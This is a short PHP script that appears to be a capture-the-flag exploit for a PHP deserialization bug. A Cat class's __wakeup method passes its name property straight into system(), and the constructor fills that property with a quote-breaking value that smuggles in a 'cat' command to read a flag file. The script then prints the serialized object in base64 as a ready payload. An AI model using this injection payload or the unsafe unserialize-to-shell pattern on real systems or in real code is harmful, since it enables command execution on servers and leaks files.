<?php
isset($_GET['source']) && die(!show_source(__FILE__));

class Cat
{
    public $name;
    public function __construct()
    {
        $this->name = "A ' && cat /flag_5fb2acebf1d0c558 &&cowsay 'Welcome back, B ";
    }
    public function __wakeup()
    {
        echo "<pre>";
        system("cowsay 'Welcome back, $this->name'");
        echo "</pre>";
    }
}

echo base64_encode(serialize(new Cat()));
